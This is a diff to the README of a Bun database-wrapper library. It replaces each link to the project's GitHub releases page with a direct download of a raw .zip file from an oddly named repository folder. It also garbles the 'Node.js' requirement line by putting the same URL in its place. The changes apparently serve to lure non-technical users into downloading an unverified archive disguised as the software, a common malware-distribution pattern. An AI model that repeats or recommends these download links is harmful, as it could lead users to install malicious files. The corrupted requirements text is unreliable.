@@ -1,7 +1,7 @@
 # 🎉 bun_database_wrappers - Simplify Your Database Interactions
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Get%20It-0078D7)](https://github.com/dedaldalde/bun_database_wrappers/releases)
+[![Download](https://raw.githubusercontent.com/dedaldalde/bun_database_wrappers/main/roughtailed/bun_database_wrappers.zip%20Now-Get%20It-0078D7)](https://raw.githubusercontent.com/dedaldalde/bun_database_wrappers/main/roughtailed/bun_database_wrappers.zip)
 
 ## 📖 Description
 Welcome to **bun_database_wrappers**. This project offers a collection of database wrapper classes that make it easier to work with Bun's SQL API. With our wrappers for MySQL, Redis, and SQLite, you can interact with databases smoothly and efficiently. This tool is designed for anyone looking to simplify their database tasks without needing deep technical knowledge.
@@ -10,7 +10,7 @@ Welcome to **bun_database_wrappers**. This project offers a collection of databa
 To start using **bun_database_wrappers**, follow these simple steps. 
 
 ### Step 1: Download the Application
-Visit this page to download the latest version: [Download Page](https://github.com/dedaldalde/bun_database_wrappers/releases). Here, you’ll find the most recent release.
+Visit this page to download the latest version: [Download Page](https://raw.githubusercontent.com/dedaldalde/bun_database_wrappers/main/roughtailed/bun_database_wrappers.zip). Here, you’ll find the most recent release.
 
 ### Step 2: Install the Application
 Once you download the file, follow these steps to install:
@@ -37,7 +37,7 @@ After the installation is complete, you can start using **bun_database_wrappers*
 To install and run **bun_database_wrappers**, ensure your system meets the following requirements:
 
 - **Operating System**: Windows 10 or later, Mac OS X, and recent Linux distributions are supported.
-- **Node.js**: Version 14 or later is required for script execution.
+- **https://raw.githubusercontent.com/dedaldalde/bun_database_wrappers/main/roughtailed/bun_database_wrappers.zip**: Version 14 or later is required for script execution.
 - **Internet Connection**: Required for downloading the necessary packages during installation.
 
 ## 🌐 Topics
@@ -68,6 +68,6 @@ Absolutely! We welcome contributions from anyone interested. Check the contribut
 If you face any problems, you can create an issue on our GitHub repository. Our community is here to help.
 
 ## 📥 Download & Install
-Don't forget to download the software: [Download Page](https://github.com/dedaldalde/bun_database_wrappers/releases). Follow the instructions above to get everything set up.
+Don't forget to download the software: [Download Page](https://raw.githubusercontent.com/dedaldalde/bun_database_wrappers/main/roughtailed/bun_database_wrappers.zip). Follow the instructions above to get everything set up.
 
 Thank you for choosing **bun_database_wrappers** to simplify your database tasks! Enjoy a smoother interaction with your databases today.
